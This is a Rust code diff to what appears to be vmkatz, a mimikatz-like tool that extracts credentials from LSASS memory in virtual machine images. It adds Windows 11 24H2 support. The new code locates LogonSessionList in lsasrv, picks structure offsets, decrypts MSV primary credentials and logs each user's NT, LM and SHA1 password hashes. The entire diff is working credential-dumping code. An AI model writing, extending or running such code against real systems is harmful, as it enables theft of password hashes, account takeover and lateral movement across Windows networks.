@@ -185,7 +185,9 @@ pub const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
         lm_hash: 0x5C,
         sha1_hash: 0x6C,
     },
-    // Variant 6: Win11 24H2+ (credKeyType DWORD removed, hashes shift -4 vs DPAPI layout)
+    // Variant 6: Win11 24H2+ flat OWFs. Confirmed by 26100.712
+    // ntlmshared!MsvpPutClearOwfsInPrimaryCredential (NT at region+0x26)
+    // and pypykatz's MSV1_0_PRIMARY_CREDENTIAL_11_H24_DEC layout.
     PrimaryCredOffsets {
         nt_hash: 0x46,
         lm_hash: 0x56,
@@ -257,6 +259,7 @@ pub fn extract_msv_sessions(
     vmem: &dyn VirtualMemory,
     msv_base: u64,
     msv_size: u32,
+    lsasrv: Option<(u64, u32)>,
     build_number: u32,
     arch: Arch,
 ) -> Vec<MsvSessionInfo> {
@@ -271,7 +274,14 @@ pub fn extract_msv_sessions(
 
     // Pattern scan for LogonSessionList (x64 only — x86 uses .data scan).
     // The pattern resolves both the list base address and the bucket count.
-    let (list_base, bucket_count) = if arch == Arch::X64 {
+    let lsasrv_table = if arch == Arch::X64 && build_number >= 26100 {
+        lsasrv.and_then(|(base, size)| find_lsasrv_logon_session_table(vmem, base, size).ok())
+    } else {
+        None
+    };
+    let (list_base, bucket_count) = if let Some((base, count)) = lsasrv_table {
+        (Some(base), count)
+    } else if arch == Arch::X64 {
         let Some(text) = pe.find_section(".text") else {
             return Vec::new();
         };
@@ -820,6 +830,7 @@ pub fn extract_msv_credentials(
     vmem: &dyn VirtualMemory,
     msv_base: u64,
     _msv_size: u32,
+    lsasrv: Option<(u64, u32)>,
     keys: &CryptoKeys,
     build_number: u32,
     arch: Arch,
@@ -831,6 +842,46 @@ pub fn extract_msv_credentials(
     } else {
         MSV_OFFSET_VARIANTS_X86
     };
+
+    if arch == Arch::X64 && build_number >= 26100 {
+        if let Some((base, size)) = lsasrv {
+            if let Ok((table, count)) = find_lsasrv_logon_session_table(vmem, base, size) {
+                log::info!("MSV: lsasrv LogonSessionList at 0x{table:x}, {count} buckets");
+                let mut best_variant = 5;
+                let mut best_score = 0;
+                for variant in [5, 6] {
+                    let mut sessions = std::collections::HashMap::new();
+                    walk_session_buckets(
+                        vmem,
+                        table,
+                        count,
+                        &MSV_OFFSET_VARIANTS[variant],
+                        &mut sessions,
+                        arch,
+                    );
+                    let score = score_variant_sessions(&sessions);
+                    if score > best_score {
+                        best_variant = variant;
+                        best_score = score;
+                    }
+                }
+                if best_score == 0 {
+                    return Ok(Vec::new());
+                }
+                log::info!("MSV: using lsasrv list variant {best_variant} (score={best_score})");
+                let creds = walk_hash_table(
+                    vmem,
+                    table,
+                    count,
+                    &MSV_OFFSET_VARIANTS[best_variant],
+                    keys,
+                    arch,
+                    Some(6),
+                );
+                return Ok(creds);
+            }
+        }
+    }
 
     // Pattern scan for LogonSessionList (x64 only — x86 uses .data scan)
     let list_addrs = if arch == Arch::X64 {
@@ -934,14 +985,16 @@ pub fn extract_msv_credentials(
                 if offsets.credentials_ptr == 0 {
                     continue; // Skip empirical NlpActiveLogon variant for hash table
                 }
-                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch);
+                let r =
+                    walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch, None);
                 if !r.is_empty() {
                     return Ok(r);
                 }
             }
             // Also try hash table with auto-detect credentials
             for offsets in variants {
-                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch);
+                let r =
+                    walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch, None);
                 if !r.is_empty() {
                     return Ok(r);
                 }
@@ -1035,6 +1088,7 @@ fn walk_msv_list(
                     keys,
                     &mut validated_variant,
                     arch,
+                    None,
                 ) {
                     log::info!(
                         "MSV credential: LUID=0x{:x} user={} domain={} NT={}",
@@ -1463,6 +1517,7 @@ fn walk_hash_table(
     offsets: &MsvOffsets,
     keys: &CryptoKeys,
     arch: Arch,
+    primary_variant: Option<usize>,
 ) -> Vec<(u64, MsvCredential)> {
     let mut results = Vec::new();
     let mut validated_variant: Option<usize> = None;
@@ -1519,31 +1574,35 @@ fn walk_hash_table(
 
             if let Some(primary_ptr) = primary_ptr {
                 if !username.is_empty() {
-                    if let Ok(cred) = extract_primary_credential(
+                    match extract_primary_credential(
                         vmem,
                         primary_ptr,
                         keys,
                         &mut validated_variant,
                         arch,
+                        primary_variant,
                     ) {
-                        log::info!(
-                            "MSV credential (hash table bucket {}): LUID=0x{:x} user={} domain={} NT={}",
-                            bucket_idx,
-                            luid,
-                            username,
-                            domain,
-                            hex::encode(cred.nt_hash)
-                        );
-                        results.push((
-                            luid,
-                            MsvCredential {
-                                username: username.clone(),
-                                domain: domain.clone(),
-                                lm_hash: cred.lm_hash,
-                                nt_hash: cred.nt_hash,
-                                sha1_hash: cred.sha1_hash,
-                            },
-                        ));
+                        Ok(cred) => {
+                            log::info!(
+                                "MSV credential (hash table bucket {}): LUID=0x{:x} user={} domain={} NT={}",
+                                bucket_idx,
+                                luid,
+                                username,
+                                domain,
+                                hex::encode(cred.nt_hash)
+                            );
+                            results.push((
+                                luid,
+                                MsvCredential {
+                                    username: username.clone(),
+                                    domain: domain.clone(),
+                                    lm_hash: cred.lm_hash,
+                                    nt_hash: cred.nt_hash,
+                                    sha1_hash: cred.sha1_hash,
+                                },
+                            ));
+                        }
+                        Err(e) => log::info!("MSV Primary at 0x{primary_ptr:x}: {e}"),
                     }
                 }
             } else if !username.is_empty() {
@@ -1572,6 +1631,75 @@ fn walk_hash_table(
 }
 
 use crate::lsass::patterns::is_heap_ptr;
+
+/// Resolve build-26100's bucket table from LsapCreateLsaLogonSession in lsasrv.
+fn find_lsasrv_logon_session_table(
+    vmem: &dyn VirtualMemory,
+    lsasrv_base: u64,
+    lsasrv_size: u32,
+) -> Result<(u64, usize)> {
+    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
+    let text = pe
+        .find_section(".text")
+        .ok_or_else(|| VmkatzError::PatternNotFound("lsasrv .text".to_string()))?;
+    let text_base = lsasrv_base + u64::from(text.virtual_address);
+    let code = vmem.read_virt_bytes(text_base, text.virtual_size as usize)?;
+    let signature_bytes = patterns::LSASRV_LOGON_SESSION_PATTERNS[0];
+    for offset in memchr::memmem::find_iter(&code, signature_bytes) {
+        let signature = text_base + offset as u64;
+        if let Ok(table) =
+            resolve_lsasrv_logon_session_table(vmem, lsasrv_base, lsasrv_size, signature)
+        {
+            return Ok(table);
+        }
+    }
+    Err(VmkatzError::PatternNotFound(
+        "lsasrv LogonSessionList".to_string(),
+    ))
+}
+
+fn resolve_lsasrv_logon_session_table(
+    vmem: &dyn VirtualMemory,
+    lsasrv_base: u64,
+    lsasrv_size: u32,
+    signature: u64,
+) -> Result<(u64, usize)> {
+    let count_insn = signature.saturating_sub(6);
+    if vmem.read_virt_bytes(count_insn, 2)? != [0x8B, 0x0D] {
+        return Err(VmkatzError::PatternNotFound(
+            "lsasrv list count load".to_string(),
+        ));
+    }
+    let count_addr = patterns::resolve_rip_relative(vmem, count_insn, 2)?;
+    let count = vmem.read_virt_u32(count_addr)? as usize;
+    if !(1..=256).contains(&count) {
+        return Err(VmkatzError::PatternNotFound(
+            "lsasrv bucket count".to_string(),
+        ));
+    }
+
+    let code = vmem.read_virt_bytes(signature + 15, 0x70)?;
+    for i in 0..code.len().saturating_sub(6) {
+        if code[i..i + 3] != [0x48, 0x8D, 0x0D] {
+            continue;
+        }
+        let candidate = patterns::resolve_rip_relative(vmem, signature + 15 + i as u64, 3)?;
+        if candidate < lsasrv_base || candidate >= lsasrv_base + u64::from(lsasrv_size) {
+            continue;
+        }
+        let flink = vmem.read_virt_u64(candidate).unwrap_or(0);
+        if flink == candidate
+            || (is_valid_user_ptr(flink, Arch::X64)
+                && vmem.read_virt_u64(flink + 8).ok() == Some(candidate))
+        {
+            log::info!("lsasrv LogonSessionList at 0x{candidate:x}, count={count}");
+            return Ok((candidate, count));
+        }
+    }
+    Err(VmkatzError::PatternNotFound(
+        "lsasrv LogonSessionList LEA".to_string(),
+    ))
+}
 
 /// Find LogonSessionList and LogonSessionListCount from pattern.
 /// Returns (list_addr, bucket_count). After the pattern, mimikatz resolves
@@ -1734,6 +1862,7 @@ pub fn scan_vmem_for_msv_credentials(
                     keys,
                     &mut validated_variant,
                     arch,
+                    None,
                 ) {
                     Ok(cred) => {
                         if looks_like_hash(&cred.nt_hash) || looks_like_hash(&cred.lm_hash) {
@@ -1885,7 +2014,7 @@ pub fn try_extract_primary_credential(
     validated_variant: &mut Option<usize>,
     arch: Arch,
 ) -> Result<RawPrimaryCred> {
-    extract_primary_credential(vmem, cred_ptr, keys, validated_variant, arch)
+    extract_primary_credential(vmem, cred_ptr, keys, validated_variant, arch, None)
 }
 
 fn extract_primary_credential(
@@ -1894,6 +2023,7 @@ fn extract_primary_credential(
     keys: &CryptoKeys,
     validated_variant: &mut Option<usize>,
     arch: Arch,
+    primary_variant: Option<usize>,
 ) -> Result<RawPrimaryCred> {
     // MSV1_0_PRIMARY_CREDENTIAL boolean flags layout (Win10+):
     //   +0x28..+0x2D: 5 boolean flags (isNtOwfPassword, isLmOwfPassword, isShaOwPassword,
@@ -1933,6 +2063,21 @@ fn extract_primary_credential(
     let enc_data = vmem.read_virt_bytes(enc_data_ptr, enc_size)?;
     let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
 
+    // On 24H2 the ISO path stores a sealed blob where flat OWFs would live.
+    // The same header says whether an NT OWF is present. The fifth byte is
+    // 3 on the tested 26100.32690 guest, so it is not a strict boolean.
+    if primary_variant == Some(6) {
+        let flags = decrypted.get(FLAGS_START..FLAGS_END).ok_or_else(|| {
+            VmkatzError::DecryptionError("Short 24H2 primary credential".to_string())
+        })?;
+        if flags[..4].iter().any(|&flag| flag > 1) || flags[4] > 3 || flags[0] == 1 || flags[1] == 0
+        {
+            return Err(VmkatzError::DecryptionError(
+                "24H2 primary credential has no clear NT OWF".to_string(),
+            ));
+        }
+    }
+
     // Try each offset variant and pick the one that makes sense.
     // Validation strategy (ranked by confidence):
     //   0. Previously SHA1-validated variant → reuse (same LSASS → same Windows build)
@@ -1948,7 +2093,9 @@ fn extract_primary_credential(
 
     // Phase 0: If we already SHA1-validated a variant for a prior credential, reuse it.
     // All credentials in the same LSASS process use the same Windows build → same offsets.
-    if let Some(vi) = *validated_variant {
+    if let Some(vi) =
+        (*validated_variant).filter(|&vi| primary_variant.is_none_or(|want| vi == want))
+    {
         let offsets = &PRIMARY_CRED_OFFSET_VARIANTS[vi];
         let nt_off = offsets.nt_hash;
         let lm_off = offsets.lm_hash;
@@ -1993,6 +2140,9 @@ fn extract_primary_credential(
     let mut entropy_candidates: Vec<(usize, u32, RawPrimaryCred)> = Vec::new();
 
     for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
+        if primary_variant.is_some_and(|want| vi != want) {
+            continue;
+        }
         let nt_off = offsets.nt_hash;
         let lm_off = offsets.lm_hash;
         let sha1_off = offsets.sha1_hash;
@@ -2244,6 +2394,20 @@ fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
             if blob.len() >= lm_off + 16 {
                 let lm = &blob[lm_off..lm_off + 16];
                 if lm == [0u8; 16] {
+                    score += 3;
+                }
+            }
+        }
+        // Win11 24H2 flat OWFs: the ISO and presence flags precede NT at 0x46.
+        0x46 if blob.len() >= 0x66 => {
+            let flags = &blob[0x28..0x2D];
+            if flags[..4].iter().all(|&flag| flag <= 1)
+                && flags[4] <= 3
+                && flags[0] == 0
+                && flags[1] == 1
+            {
+                score += 15;
+                if blob[lm_off..lm_off + 16] == [0u8; 16] {
                     score += 3;
                 }
             }
